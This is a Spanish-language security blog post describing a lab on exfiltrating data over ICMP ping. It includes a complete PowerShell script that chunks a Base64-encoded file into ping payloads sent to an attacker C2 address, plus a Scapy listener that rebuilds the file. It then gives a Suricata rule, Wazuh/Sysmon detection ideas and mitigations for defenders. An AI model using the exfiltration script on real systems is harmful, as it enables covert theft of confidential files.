---
title: "Living off the Land: Cómo los atacantes usan «Ping» para exfiltrar datos (y cómo detectarlo en SOC)"
description: "Aprende cómo los atacantes usan técnicas Living off the Land para exfiltrar datos confidenciales sobre ICMP (Ping), y cómo detectarlo con Suricata y Wazuh."
pubDate: "2026-01-25"
author: "EVLBYTE"
tags: ["Blue Team", "Canales Encubiertos", "Exfiltración ICMP", "Living off the Land", "MITRE ATT&amp;CK", "PowerShell", "Red Team", "Suricata", "Wazuh"]
category: "Ciberseguridad"
heroImage: "/images/2026_01_gemini_generated_image_lzmeqxlzmeqxlzme.png"
draft: false
---

![Living off the Land ICMP Exfiltration](/images/2026_01_gemini_generated_image_lzmeqxlzmeqxlzme.png)

## 1. Introducción: Canales Encubiertos y Living off the Land

En el panorama actual de la ciberseguridad, los atacantes ya no requieren desplegar malware complejo o payloads ruidosos para extraer información sensible de una organización. A menudo, las herramientas nativas del propio sistema operativo y los protocolos de red comúnmente autorizados son suficientes para lograr sus objetivos.

En este laboratorio analizaremos la técnica T1048.003 (Exfiltration Over Alternative Protocol: ICMP) de la matriz MITRE ATT&CK. Simularemos un escenario en el que un atacante utiliza paquetes ICMP (el protocolo detrás del comando ping) para exfiltrar archivos confidenciales desde un host Windows comprometido sin abrir puertos sospechosos ni generar tráfico HTTP/FTP anómalo, y detallaremos cómo un equipo de respuesta (Blue Team) puede detectar esta actividad en el SOC.

## 2. Arquitectura del Laboratorio

Para comprobar la efectividad tanto del canal encubierto como de su telemetría defensiva, desplegamos un laboratorio que replica una red corporativa con inspección NIDS y monitoreo de endpoints:

![Topología del Laboratorio de Exfiltración ICMP](/images/2026_01_lab-exfiltratacion-icmp.png)

*Topología del laboratorio: Exfiltración mediante ICMP con captura en espejo y correlación de eventos.*

Los componentes de la topología se distribuyen de la siguiente forma:

- Víctima (Windows Endpoint): Estación interna corporativa comprometida. Utiliza técnicas Living off the Land (LotL) ejecutando PowerShell puro y la API .NET nativa de red sin descargar ejecutables externos.
- Atacante (C2 Server): Servidor Linux en la nube o externo esperando los paquetes ICMP Echo Request para capturar los datos y reconstruir el archivo en destino.
- Canal Encubierto (ICMP Tunneling): Tráfico de diagnóstico aparentemente inofensivo que atraviesa el firewall perimetral por falta de inspección profunda de datos (DPI).
- Capa Defensiva (Blue Team):

Port Mirroring: Duplicación de tráfico en switch administrable hacia la sonda defensiva.
Suricata (NIDS): Detección basada en firmas y anomalías de longitud de datos ICMP (dsize).
Wazuh (SIEM / HIDS): Agente en el endpoint que recolecta eventos de Sysmon y PowerShell Script Block Logging (Event ID 4104).

## 3. Fase Ofensiva: Exfiltración de Datos con PowerShell (Red Team)

El estándar RFC 792 permite que los paquetes ICMP Echo Request incluyan datos arbitrarios de relleno (payload) que el receptor debe devolver intactos en el Echo Reply. Windows normalmente envía un payload de 32 bytes con secuencias alfabéticas estándar (abcdefghijklmnopqrstuvwabcdefghi).

El atacante aprovecha este campo de datos para incrustar fragmentos de un archivo codificado en Base64. El script en PowerShell realiza las siguientes operaciones:

1. Calcula el hash MD5 original del archivo para verificar su integridad tras el reensamblado.
2. Lee los bytes del archivo y genera la representación en Base64.
3. Divide la cadena Base64 en fragmentos (chunks) de tamaño parametrizable.
4. Instancia System.Net.NetworkInformation.Ping y envía cada fragmento en el buffer del paquete ICMP hacia el C2 con un retardo configurable para evitar saturar el canal.

### Script del Endpoint: Invoke-IcmpExfiltration.ps1

```powershell
param(
    [Parameter(Mandatory=$true)] [string]$FilePath,
    [Parameter(Mandatory=$true)] [string]$TargetIP,
    [Parameter(Mandatory=$true)] [int]$BytesPerPacket = 64, # Tamaño del chunk Base64
    [Parameter(Mandatory=$true)] [int]$DelayMs = 50         # Retardo entre ráfagas
)

$rutaActual = (Get-Location).Path
$rutaAbsoluta = Join-Path $rutaActual $FilePath
if (-not (Test-Path $rutaAbsoluta)) { 
    Write-Host "[-] Error: Archivo no encontrado en $rutaAbsoluta" -ForegroundColor Red
    exit 
}

# 1. Calcular Hash MD5 del archivo original
$fileStream = [System.IO.File]::OpenRead((Get-Item $rutaAbsoluta).FullName)
$md5 = [System.Security.Cryptography.MD5]::Create()
$hashBytes = $md5.ComputeHash($fileStream)
$fileStream.Close()
$md5Original = [BitConverter]::ToString($hashBytes) -replace "-"
Write-Host "[*] MD5 Original: $md5Original" -ForegroundColor Yellow

# 2. Leer archivo y convertir a Base64
$fileBytes = [System.IO.File]::ReadAllBytes($rutaAbsoluta)
$base64Data = [Convert]::ToBase64String($fileBytes)
$totalLength = $base64Data.Length
$totalPackets = [Math]::Ceiling($totalLength / $BytesPerPacket)

Write-Host "[*] Longitud Base64: $totalLength caracteres" -ForegroundColor Cyan
Write-Host "[*] Paquetes estimados: $totalPackets" -ForegroundColor Cyan

# 3. Inicializar objeto Ping .NET
$ping = New-Object System.Net.NetworkInformation.Ping
$options = New-Object System.Net.NetworkInformation.PingOptions
$options.DontFragment = $true

# 4. Transmisión secuencial de fragmentos
$currentPos = 0
$packetCount = 0

while ($currentPos -lt $totalLength) {
    $len = [Math]::Min($BytesPerPacket, $totalLength - $currentPos)
    $chunk = $base64Data.Substring($currentPos, $len)
    $buffer = [System.Text.Encoding]::ASCII.GetBytes($chunk)
    
    try {
        $ping.Send($TargetIP, 1000, $buffer, $options) | Out-Null
        $packetCount++
        Write-Progress -Activity "Exfiltrando archivo via ICMP" -Status "$packetCount / $totalPackets" -PercentComplete (($packetCount / $totalPackets) * 100)
    } catch {
        Write-Host "[-] Error transmitiendo paquete $packetCount" -ForegroundColor Red
    }
    
    $currentPos += $len
    Start-Sleep -Milliseconds $DelayMs
}

Write-Host "`n[+] Exfiltración completada exitosamente." -ForegroundColor Green
```

### Receptor en el Servidor C2 (Python con Scapy)

En el servidor del atacante, un listener captura los paquetes ICMP entrantes, extrae el buffer de carga útil y reconstruye el binario decodificando el Base64 acumulado:

```python
from scapy.all import sniff, ICMP, Raw
import base64
import hashlib

received_chunks = []

def process_icmp(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8: # Echo Request
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode("ascii", errors="ignore")
            received_chunks.append(payload)
            print(f"[+] Chunk recibido ({len(payload)} bytes). Total: {len(received_chunks)}")

print("[*] Servidor C2 a la escucha de paquetes ICMP Echo Request...")
sniff(filter="icmp", prn=process_icmp, timeout=60)

# Reensamblado
full_base64 = "".join(received_chunks)
try:
    file_bytes = base64.b64decode(full_base64)
    with open("archivo_recuperado.bin", "wb") as f:
        f.write(file_bytes)
    
    md5_recuperado = hashlib.md5(file_bytes).hexdigest().upper()
    print(f"[✓] Archivo reconstruido. MD5: {md5_recuperado}")
except Exception as e:
    print(f"[-] Error en decodificación: {e}")
```

## 4. Fase Defensiva: Detección y Respuesta en el SOC (Blue Team)

La combinación de visibilidad en red (NIDS) y registros de actividad de endpoint (HIDS/EDR) es fundamental para detectar canales encubiertos antes de que se complete la fuga de información sensible.

### A. Detección en Red con Suricata (NIDS)

Un ping normal de Windows genera un payload de 32 bytes de datos. Cuando el script exfiltra datos, incrementa deliberadamente el tamaño del payload (por ejemplo, 64 a 512 bytes) para maximizar el throughput. Implementamos una regla en Suricata que vigila el parámetro dsize y establece un umbral de frecuencia:

```text
# Regla para detectar ráfagas de paquetes ICMP con payload inusual
alert icmp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"HACKTHEBYTE - Sospecha de Exfiltracion por Canal Encubierto ICMP";
    itype:8;
    dsize:>64;
    threshold:type both, track by_src, count 15, seconds 30;
    classtype:bad-unknown;
    sid:1000004;
    rev:1;
)
```

### B. Detección en Endpoint con Wazuh & Sysmon (HIDS / EDR)

Aunque el atacante fragmente la data en paquetes de 32 bytes para mimetizarse con el tráfico de Windows, el endpoint no puede ocultar la llamada interna del proceso:

- Sysmon (Event ID 1 - Process Creation): Monitorea ejecuciones de powershell.exe con llamadas a buffers de red y argumentos codificados en Base64.
- PowerShell Script Block Logging (Event ID 4104): Captura el código completo ejecutado en memoria. Alertas configuradas en Wazuh para detectar invocaciones de la clase System.Net.NetworkInformation.Ping combinadas con System.IO.File y bucles de retardo.

## 5. Mitigaciones y Buenas Prácticas

Para cerrar este vector de fuga en redes corporativas e industriales (OT):

1. Filtrado Egress de ICMP: Bloquear el tráfico ICMP de salida hacia Internet desde hosts cliente. Si se requiere conectividad de diagnóstico, restringir el destino únicamente a los DNS internos o al gateway local.
2. Inspección Profunda de Paquetes (DPI): Configurar el firewall de siguiente generación (NGFW) para verificar que el contenido de los paquetes ICMP coincida con los patrones RFC estándar y no contenga entropía de datos codificados.
3. Restricción de PowerShell: Habilitar Constrained Language Mode y políticas de AppLocker / Windows Defender Application Control (WDAC) para evitar que usuarios no privilegiados instancien clases .NET arbitrarias de sockets de red.
